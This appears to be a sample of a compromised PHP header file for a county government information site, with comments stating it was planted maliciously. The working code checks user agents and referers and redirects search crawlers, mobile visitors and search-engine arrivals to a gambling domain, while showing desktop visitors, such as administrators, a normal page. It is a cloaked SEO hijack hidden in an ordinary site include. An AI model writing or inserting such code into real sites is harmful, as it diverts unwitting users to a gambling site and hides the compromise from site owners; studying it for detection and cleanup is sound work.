<?php
/**
 * 被植入“伪装跳转”的公共头部文件 (includes/header.php)。
 * 恶意代码：只有百度/谷歌爬虫或手机访问才跳转到博彩站。
 * 管理员用桌面浏览器访问时完全正常。
 */
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$ref = strtolower($_SERVER['HTTP_REFERER'] ?? '');

$isBot = strpos($ua, 'baiduspider') !== false
      || strpos($ua, 'googlebot') !== false
      || strpos($ua, 'bingbot') !== false;
$isMobile = strpos($ua, 'mobile') !== false || strpos($ua, 'android') !== false || strpos($ua, 'iphone') !== false;
$fromSearch = strpos($ref, 'baidu.com') !== false || strpos($ref, 'google.') !== false;

if (($isBot || $isMobile || $fromSearch)) {
    header('Location: https://www.8888bet-vip.top/landing');
    exit;
}
?><!DOCTYPE html>
<html lang="zh-CN">
<head><meta charset="utf-8"><title>某某县政务公开</title></head>
<body>
<div class="header">某某县人民政府 · 政务公开</div>
